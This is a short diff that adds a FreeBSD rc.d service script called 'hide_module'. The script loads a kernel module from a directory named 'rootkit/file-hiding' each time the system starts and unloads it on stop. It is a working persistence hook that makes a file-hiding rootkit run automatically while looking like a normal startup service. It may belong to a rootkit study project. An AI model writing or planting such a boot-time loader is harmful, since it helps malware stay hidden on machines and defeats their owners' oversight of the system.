@@ -1,0 +1,21 @@
+#!/bin/sh
+
+. /etc/rc.subr
+
+name="hide_module"
+start_cmd="${name}_start"
+stop_cmd="${name}_stop"
+
+hide_module_start()
+{
+	kldload /home/jack/rootkit/file-hiding/hide.ko
+}
+
+hide_module_stop()
+{
+	kldunload hide.ko
+}
+
+load_rc_config $name
+run_rc_command "$1"
+
